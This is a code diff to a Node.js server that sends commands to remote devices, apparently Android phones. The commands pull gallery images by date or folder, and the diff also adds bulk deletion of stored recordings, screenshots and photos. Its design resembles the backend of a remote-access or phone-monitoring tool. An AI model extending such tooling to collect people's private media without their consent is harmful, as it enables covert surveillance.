@@ -971,6 +971,46 @@ app.post("/api/devices/:deviceId/gallery/by-date", (req, res) => {
   }
 });
 
+// Flexible gallery query - combine all filters
+app.post("/api/devices/:deviceId/gallery/query", (req, res) => {
+  const { count = 50, fromDate, toDate, folders, onlyMetadata = false } = req.body;
+  const dev = devices.get(req.params.deviceId);
+  if (dev && dev.isOnline && dev.socketId) {
+    const requestId = `req_${Date.now()}`;
+    io.to(dev.socketId).emit("get_gallery_images", {
+      targetDeviceId: req.params.deviceId,
+      count,
+      fromDate: fromDate || undefined,
+      toDate: toDate || undefined,
+      folders: folders || undefined,
+      onlyMetadata,
+      requestId,
+    });
+    res.json({ success: true, requestId });
+  } else {
+    res.status(404).json({ error: "Device not found or offline" });
+  }
+});
+
+// Command device to get images by folder
+app.post("/api/devices/:deviceId/gallery/by-folder", (req, res) => {
+  const { folder = "camera", count = 20, upload = false } = req.body;
+  const dev = devices.get(req.params.deviceId);
+  if (dev && dev.isOnline && dev.socketId) {
+    const requestId = `req_${Date.now()}`;
+    io.to(dev.socketId).emit("get_images_by_folder", {
+      targetDeviceId: req.params.deviceId,
+      folder,
+      count,
+      upload,
+      requestId,
+    });
+    res.json({ success: true, requestId });
+  } else {
+    res.status(404).json({ error: "Device not found or offline" });
+  }
+});
+
 // Command device to upload specific images by ID
 app.post("/api/devices/:deviceId/gallery/upload", (req, res) => {
   const { imageIds } = req.body;
@@ -991,20 +1031,97 @@ app.post("/api/devices/:deviceId/gallery/upload", (req, res) => {
   }
 });
 
+// ─── BULK DELETE per device ──────────────────────────────
+
+// Helper to delete all files in a directory
+function deleteAllInDir(dir) {
+  if (!fs.existsSync(dir)) return 0;
+  let count = 0;
+  try {
+    const files = fs.readdirSync(dir).filter(f => !f.startsWith("."));
+    files.forEach(f => {
+      try { fs.unlinkSync(path.join(dir, f)); count++; } catch (e) {}
+    });
+  } catch (e) {}
+  return count;
+}
+
+// Delete all recordings for a device
+app.delete("/api/recordings/:deviceId", (req, res) => {
+  try {
+    const dir = path.join(RECORDINGS_DIR, req.params.deviceId);
+    const count = deleteAllInDir(dir);
+    log(`Deleted all recordings for ${req.params.deviceId}: ${count} files`);
+    return res.json({ success: true, deleted: count });
+  } catch (err) {
+    return res.status(500).json({ error: "Failed to delete recordings" });
+  }
+});
+
+// Delete all screenshots for a device
+app.delete("/api/screenshots/:deviceId", (req, res) => {
+  try {
+    const dir = path.join(SCREENSHOTS_DIR, req.params.deviceId);
+    const count = deleteAllInDir(dir);
+    log(`Deleted all screenshots for ${req.params.deviceId}: ${count} files`);
+    return res.json({ success: true, deleted: count });
+  } catch (err) {
+    return res.status(500).json({ error: "Failed to delete screenshots" });
+  }
+});
+
+// Delete all gallery images for a device
+app.delete("/api/gallery/:deviceId", (req, res) => {
+  try {
+    const dir = path.join(GALLERY_DIR, req.params.deviceId);
+    const count = deleteAllInDir(dir);
+    galleryImages.delete(req.params.deviceId);
+    log(`Deleted all gallery images for ${req.params.deviceId}: ${count} files`);
+    return res.json({ success: true, deleted: count });
+  } catch (err) {
+    return res.status(500).json({ error: "Failed to delete gallery images" });
+  }
+});
+
 // ─── DEVICE DELETE (offline only) ─────────────────────────
 
 app.delete("/api/devices/:deviceId", (req, res) => {
-  const dev = devices.get(req.params.deviceId);
+  const deviceId = req.params.deviceId;
+  const dev = devices.get(deviceId);
   if (!dev) {
     return res.status(404).json({ error: "Device not found" });
   }
   if (dev.isOnline) {
     return res.status(400).json({ error: "Cannot delete an online device" });
   }
-  devices.delete(req.params.deviceId);
-  log(`Device removed from listing: ${dev.deviceName} (${req.params.deviceId})`);
+
+  // Delete all device data: recordings, screenshots, gallery
+  const dirsToDelete = [
+    path.join(RECORDINGS_DIR, deviceId),
+    path.join(SCREENSHOTS_DIR, deviceId),
+    path.join(GALLERY_DIR, deviceId),
+  ];
+  let deletedFiles = 0;
+  for (const dir of dirsToDelete) {
+    if (fs.existsSync(dir)) {
+      try {
+        const files = fs.readdirSync(dir);
+        files.forEach(f => {
+          try { fs.unlinkSync(path.join(dir, f)); deletedFiles++; } catch (e) {}
+        });
+        fs.rmdirSync(dir);
+      } catch (e) {
+        log(`Error cleaning up ${dir}: ${e.message}`);
+      }
+    }
+  }
+  // Clean in-memory gallery metadata
+  galleryImages.delete(deviceId);
+
+  devices.delete(deviceId);
+  log(`Device removed with all data (${deletedFiles} files): ${dev.deviceName} (${deviceId})`);
   broadcastDevices();
-  return res.json({ success: true });
+  return res.json({ success: true, deletedFiles });
 });
 
 // ─── APK MANAGEMENT ────────────────────────────────────────
